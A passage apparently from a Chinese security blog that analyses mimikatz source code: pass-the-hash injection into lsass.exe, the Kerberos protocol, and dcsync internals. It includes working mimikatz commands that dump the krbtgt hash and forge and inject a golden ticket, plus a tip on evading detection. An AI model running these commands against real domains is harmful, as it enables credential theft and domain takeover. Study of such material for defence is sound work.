class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">61</span>, <span class="number">-73</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1809,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">67</span>, <span class="number">-89</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/cIDEWiDFgUuh.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_enum寻找登录凭证，最终调用kuhl_m_sekurlsa_enum_callback_msv_pth函数将加密之后的凭证写入Lsass.exe进程的指定的LogonSessionList数组中。首先比较是否是指定的LogonId。然后调用kuhl_m_sekurlsa_msv_enum_cred()函数</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)</div><div class="line">&#123;</div><div class="line">PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;</div><div class="line">MSV1_0_PTH_DATA_CRED credData = &#123;pData, pthData&#125;;</div><div class="line"><span class="keyword">if</span>(SecEqualLuid(pData-&gt;LogonId, pthData-&gt;LogonId))</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_msv_enum_cred(pData-&gt;cLsass, pData-&gt;pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &amp;credData);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最终调用kuhl_m_sekurlsa_msv_enum_cred_callback_pth，在kuhl_m_sekurlsa_msv_enum_cred_callback_pth函数中，首先会调用kuhl_m_sekurlsa_nt6_LsaEncryptMemory函数加密NTLM散列。其加密逻辑是如果加密的凭证能被8整除，则使用AES，否则使用3DES。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(*<span class="function"><span class="title">pthDataCred</span>-&gt;</span><span class="function"><span class="title">pSecData</span>-&gt;</span><span class="function"><span class="title">lsassLocalHelper</span>-&gt;</span><span class="function"><span class="title">pLsaProtectMemory</span>)(msvCredentials, pCredentials-&gt;</span>Credentials.Length);</div><div class="line">VOID WINAPI kuhl_m_sekurlsa_nt6_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);</div><div class="line">&#125;</div><div class="line"><span class="comment">//////加密逻辑</span></div><div class="line"><span class="keyword">if</span>(cbMemory % <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line">hKey = &amp;kAes.hKey;</div><div class="line">cbIV = sizeof(InitializationVector);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">hKey = &amp;k3Des.hKey;</div><div class="line">cbIV = sizeof(InitializationVector) / <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">__try</div><div class="line">&#123;</div><div class="line">status = cryptFunc(*hKey, pMemory, cbMemory, <span class="number">0</span>, LocalInitializationVector, cbIV, pMemory, cbMemory, &amp;cbResult, <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_copy函数中的WriteProcessMemory写入Lsass.exe进程空间。最后Resume线程。完事PtH。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="function"><span class="title">status</span> = WriteProcessMemory(Destination-&gt;</span><span class="function"><span class="title">hMemory</span>-&gt;</span><span class="function"><span class="title">pHandleProcess</span>-&gt;</span><span class="function"><span class="title">hProcess</span>, Destination-&gt;</span><span class="function"><span class="title">address</span>, Source-&gt;</span>address, Length, NULL);</div><div class="line">break;</div></pre></td></tr></table></figure></li></ul><h2 id="NTLM-凭证生成"><a href="#NTLM-凭证生成" class="headerlink" title="NTLM 凭证生成"></a>NTLM 凭证生成</h2><ul><li><code>msv1_0!LsaApLogonUserEx2</code>—&gt;<code>lsasrv!LsapCreateLsaLogonSession</code>—-&gt;<code>msv1_0!SpAcceptCredentials</code></li></ul><h2 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h2><ul><li><p>Kerberos协议的组成角色：</p><ul><li>客户端：发送请求的一方</li><li>服务端：接收请求的一方</li><li>秘钥分发中心(Key Distribution Center KDC),KDC分为两部分：<ul><li>AS(Authentication Server)：用于认证客服端，以及发放后续客户端用于访问TGS(Ticket Granting Server)的TGT(凭据授予票据Ticket Granting Ticket)</li><li>TGS(Ticket Granting Server):同于发放认证过程和客户端访问服务端的票据</li></ul></li></ul></li><li><p>Kerberos协议通过引入同时认识客户端(A)和服务端(B)的秘钥分发中心(C)实现身份认证。简化的流程如下：</p><ul><li>第一步：客户端向KDC请求获取访问服务端的服务授予票据</li><li>第二歩：客户端拿着服务授予票据访问服务端</li></ul></li><li><p>上述步骤存在的问题：</p><ul><li>1.KDC如何判断客户端的安全性(真实性)？</li><li>2.服务端如何判断客户端的服务授予票据的真实性？</li></ul></li><li><p>Kerberos认证协议的前提：</p><ul><li>Kerberos存在一个数据库，运维人员会添加可以使用认证服务的人员和网络服务。相当于一个白名单。</li><li>当用户被添加到数据库，会根据当前的密码生成一把秘钥存储在数据库中(很重要)。并且保存用户的基本信息，以供认证。</li><li>只要两两通讯就会进行认证。</li></ul></li><li><p>两个个人理解的概念：机器秘钥(与机器密码强相关的秘钥)，会话秘钥(CT_SK,CS_SK)本次会话中使用的秘钥，会消失。</p></li></ul><h3 id="Kerberos协议第1次通讯"><a href="#Kerberos协议第1次通讯" class="headerlink" title="Kerberos协议第1次通讯"></a>Kerberos协议第1次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端明文向KDC发送请求，该次请求中携带了自己的用户名，主机IP，和当前时间戳</li></ul></li><li><p>KDC行为：</p><ul><li>1.KDC(其中的AS认证服务器)在数据库中比较，是否存在该用户名的用户，<strong>但是不会判断身份的可靠性</strong></li><li>2.如果没有该用户名，认证失败。如果存在，则发送下面两部分数据给客户端<ul><li>TGT(Ticket Granting Ticket即票据授予票据,TGT客户端使用TGT去KDC获取服务授予票据):TGT包含客户端的Name,Ip,时间戳，TGS_Name，TGT的有效时间，以及<strong>一把客户端和TGS通讯的CT_SK(Client And TGS Session Key CT_SK)</strong>。TGT使用TGS的秘钥进行加密(客户端无法解密)，并且秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li><li>将CT_SK,TGS_Name,TGT的有效时间，当前时间戳等数据使用<strong>客户端的秘钥(保存在数据库中)</strong>加密的数据。该秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li></ul></li></ul></li><li><p>总结：KDC总是会传递两部分数据，一部分是客户端能解密的数据(KDC存在客户端秘钥)，第二部分是客户端不能解密的数据(使用TGS秘钥)，<strong>重点是将使用客户端秘钥加密过的CT_SK传递给客户端，避免CT_SK中间被窃取，因为非法的客户端不存在真实的客户端秘钥！这样就实现了CT_SK的传递</strong>。</p></li><li>备注：<strong>凭据信息(TGT,ST)是由和机器密码强相关的秘钥进行加密，主机秘钥在网络中不传递。由来校验加密数据的端点信息和凭据中的端点信息。第一次通讯主要有两个目的，第一，验证客户端是否存在，第二，传递CT_KS会话秘钥。</strong></li></ul><h3 id="Kerberos协议第2次通讯"><a href="#Kerberos协议第2次通讯" class="headerlink" title="Kerberos协议第2次通讯"></a>Kerberos协议第2次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端接收上述KDC发送的TGT和加密数据，利用自己的秘钥解密加密数据，<strong>并获取CT_SK会话秘钥</strong>。如果获取的时间戳和自己发送的时间戳差值大于5mins，则认证结束。否则客户端向TGS发送请求。</li><li>2.利用接收到的CT_SK(Session Key)加密自身的客户端信息，包括客户端名，ip，时间戳。</li><li>3.客户端向KDC发送要访问的服务端的明文信息。</li><li>4.客户端向KDC发送没改变的TGT。</li></ul></li><li><p>TGS行为：</p><ul><li>1.TGS验证客户端明文发送的服务端信息,如果不存在，则认证结束。</li><li>2.TGS利用自身的秘钥解密TGT，得到时间戳和CT_SK,如果时间超过5mins，则认证结束。</li><li>3.使用CT_SK解密客户端发送的客户端信息，比较这个客户端信息和TGT里面的客户端信息进行比对。如果不同则，认证结束。</li><li>4.KDC发送响应内容给客户端：<ul><li>服务端秘钥加密的Ticket(ST),内容包括：客户端信息，Serivce IP，ST的有效时间，时间戳，以及客户端服务端通信的CS_SK</li><li>使用CT_SK加密的内容，其中包括CS_SK，时间戳,ST的有效期。此时客户端已经使用自身的秘钥解密的第一次通讯接收的第二部分数据，获取了CT_SK，<strong>并进行了缓存</strong>。</li></ul></li></ul></li><li><p>总结：本次通讯，有三个目的，第一：客户端会发送服务端信息以让TGS确认<strong>是否存在服务端</strong>，以及CT_SK加密之后的客户端信息和TGT，以让TGS比较两个数据中保存的<strong>客户端信息是否相同</strong>。并<strong>传递ST和包含CS_SK会话秘钥</strong>的加密数据。</p></li><li>备注：<strong>每一次通讯，KDC都会把下一次通讯所需要的会话秘钥传递给客户端。并且客户端每次都会发送两次包含自身数据的报文给校验者从而校验自身，其中TGT和ST的机器秘钥(TGS和服务端机器秘钥)都不经过传递，保证安全性。</strong></li></ul><h3 id="Kerberos协议第3次通讯"><a href="#Kerberos协议第3次通讯" class="headerlink" title="Kerberos协议第3次通讯"></a>Kerberos协议第3次通讯</h3><ul><li>客户端行为<ul><li>1.客户端收到KDC的响应，解密有CT_SK加密的第二部分数据，确认无误后，<strong>并获取CS_SK会话秘钥</strong>继续。</li><li>2.客户端使用CS_SK将自己主机信息和时间戳加密发送给服务端</li><li>3.客户端将第二次通讯获得的服务端凭证ST发送给服务端</li></ul></li><li><p>服务端行为</p><ul><li>1.服务端接收到客户端发来的两部分数据后，服务端使用服务端秘钥解密ST，校验时间戳。</li><li>2.使用CS_SK解密客户端发来的第一部分数据，得到TGS认证过的客户端信息。然后对比这部分数据的客户端信息和经过服务端秘钥加密的ST的客户端信息，判断客户端的合理性。</li><li>3.服务端返回的CT_SK加密的数据，以是的客户端确认服务端身份。就此，Kerberos认证完成。</li></ul></li><li><p>总结：第三次通讯，服务端利用自身的秘钥解密ST，获取其中的客户端信息，然后<strong>比较客户端发来的客户端信息</strong>。从而客户端的合理性。</p></li></ul><p>Ref:<a href="https://seevae.github.io/2020/09/12/详解kerberos认证流程/" target="_blank" rel="external">详解kerberos认证流程</a></p><h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><ul><li>Ptt主要在域内进行横向移动的技术。</li></ul><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul><li>特点：有效时间长(默认是十年)，不会因为密码的修改导致票据的失效，用户名可以是任意的虚拟的。</li><li><p>制作黄金票据的前提：</p><ul><li>域名称</li><li>SID</li><li>域的kbrtgt的Hash(要求短暂的拿到域控服务器的控制权)</li><li>任意用户名</li></ul></li><li><p>在域控服务器中(备注，也可以不登录域控即可获取<a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">https://www.freebuf.com/articles/network/286137.html</a>)，使用<code>mimikatz.exe &quot;lsadump::dcsync /domain:corp.hacky.ren /user:krbtgt&quot; &gt;&gt; golden.txt</code>,可以得到SID以及kbrtgt的Hash，以及域名称。<br>  <img src="http://hacky.wang/blog/20220224/v1o2BzRHGqRi.png?imageslim" alt="mark"></p></li><li><p>在非域控主机中，使用<code>mimikatz.exe &quot;kerberos::golden /admin:hacky /domain:corp.hacky.ren /sid:S-1-5-21-442036050-123597327-3835497791 kbrgtg:ac9a6f3e6ea0f74274725c39179f44a1 /ptt&quot;</code>生成黄金票据，并将其导入内存。</p><ul><li>/admin参数：表示任意伪造的用户名(最好改为受控的主机名，因为部分安全产品是通过检索登录的域账户是否存在而检测PtT)</li><li>/sid:sid数值，取最后一个“-”之前的内容</li><li>/ptt:直接导入内存，这样就不需要使用”kerberos::ptt导入了”<br><img src="http://hacky.wang/blog/20220224/IlxDKwvIESBp.png?imageslim" alt="mark"></li></ul></li><li><p>使用<code>klist</code>或者<code>kerberos::list</code>查看伪造的金票是否被导入。<br>  <img src="http://hacky.wang/blog/20220224/qYBfHpfYehbB.png?imageslim" alt="mark"></p></li><li><p>修改域控服务器密码为abcd.123，然后在远程登录域控，测试金票是否有效。<br>  <img src="http://hacky.wang/blog/20220224/cgK4nT1YidQt.png?imageslim" alt="mark"></p></li><li><p>Ref:</p><ul><li><a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">内网渗透测试：DCSync 攻击技术的利用</a></li><li><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/" target="_blank" rel="external">浅析黄金票据与白银票据</a></li></ul></li></ul><h3 id="lsadump-dcsync-源码分析"><a href="#lsadump-dcsync-源码分析" class="headerlink" title="lsadump::dcsync 源码分析"></a>lsadump::dcsync 源码分析</h3><ul><li><p>原理：不同的域控制器(DC)会进行数据同步复制，mimikatz通过模拟一个域控制器，通过GetNCChanges函数向真实的域控制器发送数据同步复制请求，获取控制器指定的用户的口令Hash。dcsync的主要特点是不需要登录域控服务器而获取用户口令HASH。需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据。</p></li><li><p>lsadump::dcsync命令源码位于<code>\mimikatz\modules\lsadump\kuhl_m_lsadump_dc.c</code>中的<code>NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])</code>函数中。</p></li><li><p>首先，通过<code>kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &amp;szTmpDc)</code>寻找域内的域控服务器，其本质会调用<code>DsGetDcName</code>API函数。</p></li><li><p>然后，通过<code>IDL_DRSGetNCChanges</code>函数，向真实域控服务器发送请求，以获取用户信息。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RtlZeroMemory(<span class="name">&amp;getChRep</span>, sizeof(<span class="name">DRS_MSG_GETCHGREPLY</span>))<span class="comment">;</span></div><div class="line">drsStatus = IDL_DRSGetNCChanges(<span class="name">hDrs</span>, <span class="number">8</span>, <span class="symbol">&amp;getChReq</span>, <span class="symbol">&amp;dwOutVersion</span>, <span class="symbol">&amp;getChRep</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>几个重要的结构体</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY</span>:用于接收<span class="type">IDL_DRSGetNCChanges</span>传来的响应消息</div><div class="line">typedef union _DRS_MSG_GETCHGREPLY &#123;</div><div class="line"><span class="type">DRS_MSG_GETCHGREPLY_V6</span> <span class="type">V6</span>;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY</span>;</div><div class="line">//////</div><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY_V6</span>表示<span class="type">DRS_MSG_GETCHGREPLY</span>的第六个版本</div><div class="line">typedef struct _DRS_MSG_GETCHGREPLY_V6 &#123;</div><div class="line"><span class="type">UUID</span> uuidDsaObjSrc;</div><div class="line"><span class="type">UUID</span> uuidInvocIdSrc;</div><div class="line"><span class="type">DSNAME</span> *pNC;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecFrom;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecTo;</div><div class="line"><span class="type">UPTODATE_VECTOR_V2_EXT</span> *pUpToDateVecSrc;</div><div class="line"><span class="type">SCHEMA_PREFIX_TABLE</span> <span class="type">PrefixTableSrc</span>;</div><div class="line"><span class="type">ULONG</span> ulExtendedRet;</div><div class="line"><span class="type">ULONG</span> cNumObjects;</div><div class="line"><span class="type">ULONG</span> cNumBytes;</div><div class="line"><span class="type">REPLENTINFLIST</span> *pObjects;</div><div class="line"><span class="type">BOOL</span> fMoreData;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeObjects;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeValues;</div><div class="line"><span class="type">DWORD</span> cNumValues;</div><div class="line"><span class="type">REPLVALINF_V1</span> *rgValues;</div><div class="line"><span class="type">DWORD</span> dwDRSError;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY_V6</span>;</div><div class="line">/////////</div><div class="line">//<span class="type">PrefixTableSrc</span>定义了从<span class="type">OID</span>到<span class="type">ATTRTYP</span>值的映射表</div><div class="line">typedef struct _SCHEMA_PREFIX_TABLE &#123;</div><div class="line"><span class="type">DWORD</span> <span class="type">PrefixCount</span>;   //<span class="type">PrefixTableEntry</span>的数量</div><div class="line"><span class="type">PrefixTableEntry</span> *pPrefixEntry; //包含了<span class="type">PrefixTableEntry</span>的数组</div><div class="line">&#125; <span class="type">SCHEMA_PREFIX_TABLE</span>;</div><div class="line">////</div><div class="line">//<span class="type">REPLENTINFLIST</span>包含了给定对象(<span class="type">Object</span>)的一个或多个属性</div><div class="line"> typedef struct <span class="type">REPLENTINFLIST</span> &#123;</div><div class="line">   struct <span class="type">REPLENTINFLIST</span>* pNextEntInf;</div><div class="line">   <span class="type">ENTINF</span> <span class="type">Entinf</span>;</div><div class="line">   <span class="type">BOOL</span> fIsNCPrefix;</div><div class="line">   <span class="type">UUID</span>* pParentGuid;</div><div class="line">   <span class="type">PROPERTY_META_DATA_EXT_VECTOR</span>* pMetaDataExt;</div><div class="line"> &#125; <span class="type">REPLENTINFLIST</span>;</div><div class="line">/////</div><div class="line">//<span class="type">AttrBlock</span> 简单的理解为属性块</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject()函数解析/描述对象，其函数原型如下,其中第一个参数prefixTable和第二个参数attributes分别表示OID和ATTRTYP的映射表，AttrBlock表示一个属性块。其最终会返回一个<code>ATTRVALBLOCK</code>结构</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void kuhl_m_lsadump_dcsync_descrObject(<span class="keyword">SCHEMA_PREFIX_TABLE </span>*<span class="keyword">prefixTable, </span></div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCWSTR szSrcDomain, </div><div class="line"><span class="keyword">BOOL </span>someExport, </div><div class="line">ATTRTYP *pSuppATT_IntId, </div><div class="line">DWORD cSuppATT_IntId)</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject最终会调用kull_m_rpc_drsr_findMonoAttr用户获取指定OID对应的属性值，其中最最最重要的是<code>kull_m_rpc_drsr_findAttr</code>函数，其函数原型如下。其会调用<code>kull_m_rpc_drsr_MakeAttid</code>函数，通过传入的OID生成一个ATTRTYP结构。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttr(</div><div class="line">SCHEMA_PREFIX_TABLE *prefixTable, </div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCSTR szOid)</div></pre></td></tr></table></figure></li><li><p>kull_m_rpc_drsr_MakeAttid函数源码如下,很显然，kull_m_rpc_drsr_MakeAttid()首先会截取OID的最后一个数字，接着调用kull_m_rpc_drsr_MakeAttid_addPrefixToTable()取ndx。然后将取到的ndx左移16位，再或运算之后，得到ATTRTYP，这其实是一个ULONG类型。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, ATTRTYP *att, <span class="built_in">BOOL</span> toAdd)</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> status = <span class="literal">FALSE</span>;</div><div class="line">DWORD lastValue, ndx;</div><div class="line">PSTR lastValueString;</div><div class="line">OssEncodedOID oidPrefix;</div><div class="line"><span class="keyword">if</span>(lastValueString = strrchr(szOid, <span class="string">'.'</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(*(lastValueString + <span class="number">1</span>))</div><div class="line">&#123;</div><div class="line">lastValueString++;</div><div class="line">lastValue = strtoul(lastValueString, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">*att = (WORD) lastValue % <span class="number">0x4000</span>;</div><div class="line"><span class="keyword">if</span>(*att &gt;= <span class="number">0x4000</span>)</div><div class="line">*att += <span class="number">0x8000</span>;</div><div class="line"><span class="keyword">if</span>(kull_m_asn1_DotVal2Eoid(szOid, &amp;oidPrefix))</div><div class="line">&#123;</div><div class="line">oidPrefix.length -= (lastValue &lt; <span class="number">0x80</span>) ? <span class="number">1</span> : <span class="number">2</span>;</div><div class="line"><span class="keyword">if</span>(status = kull_m_rpc_drsr_MakeAttid_addPrefixToTable(prefixTable, &amp;oidPrefix, &amp;ndx, toAdd))</div><div class="line">&#123;</div><div class="line">*att |= ndx &lt;&lt; <span class="number">16</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"kull_m_rpc_drsr_MakeAttid_addPrefixToTable\n"</span>);</div><div class="line">kull_m_asn1_freeEnc(oidPrefix.value);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> status;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kull_m_rpc_drsr_findAttrNoOID()遍历整个ATTRBLOCK,ATTRBLOCK结构如下，包含了一个Count表示，ATTR列表的个数，ATTR为一个列表。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _ATTRBLOCK &#123;</div><div class="line">ULONG attrCount;</div><div class="line">ATTR *pAttr;</div><div class="line">&#125; ATTRBLOCK;</div><div class="line">/<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/</span></div><div class="line"><span class="regexp">/</span><span class="regexp">//</span>函数实现如下：</div><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttrNoOID(ATTRBLOCK *attributes, ATTRTYP type)</div><div class="line">&#123;</div><div class="line">ATTRVALBLOCK *ptr = NULL;</div><div class="line">DWORD i;</div><div class="line">ATTR *attribut;</div><div class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; attributes-&gt;attrCount; i++)</div><div class="line">&#123;</div><div class="line">attribut = &amp;attributes-&gt;pAttr[i];</div><div class="line">if(attribut-&gt;attrTyp == type)</div><div class="line">&#123;</div><div class="line">ptr = &amp;attribut-&gt;AttrVal;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最后，就可以根据ATTRVALBLOCK结构，得到具体的属性值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="title">typedef</span> struct _ATTRVAL &#123;</div><div class="line"><span class="type">ULONG</span> valLen;</div><div class="line"><span class="type">UCHAR</span> *pVal;</div><div class="line">&#125; <span class="type">ATTRVAL</span>;</div><div class="line"><span class="title">typedef</span> struct _ATTRVALBLOCK &#123;</div><div class="line"><span class="type">ULONG</span> valCount;</div><div class="line"><span class="type">ATTRVAL</span> *pAVal;</div><div class="line">&#125; <span class="type">ATTRVALBLOCK</span>;</div><div class="line">/////函数实现</div><div class="line"><span class="type">PVOID</span> kull_m_rpc_drsr_findMonoAttr(<span class="type">SCHEMA_PREFIX_TABLE</span> *prefixTable, <span class="type">ATTRBLOCK</span> *attributes, <span class="type">LPCSTR</span> szOid, <span class="type">PVOID</span> <span class="class"><span class="keyword">data</span>, <span class="type">DWORD</span> *size)</span></div><div class="line">&#123;</div><div class="line"><span class="type">PVOID</span> ptr = <span class="type">NULL</span>;</div><div class="line"><span class="type">ATTRVALBLOCK</span> *valblock;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = <span class="type">NULL</span>;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span>(valblock = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOid))  //得到据<span class="type">ATTRVALBLOCK</span>结构</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(valblock-&gt;valCount == <span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">ptr = valblock-&gt;pAVal[<span class="number">0</span>].pVal;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = ptr;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = valblock-&gt;pAVal[<span class="number">0</span>].valLen;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">return ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>SID和NTLM</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_objectSid, &amp;data, NULL))</div><div class="line">&#123;</div><div class="line">kprintf(L<span class="string">"Object Security ID   : "</span>)<span class="comment">;</span></div><div class="line">kull_m_string_displaySID(data)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\n"</span>)<span class="comment">;</span></div><div class="line">rid = *GetSidSubAuthority(data, 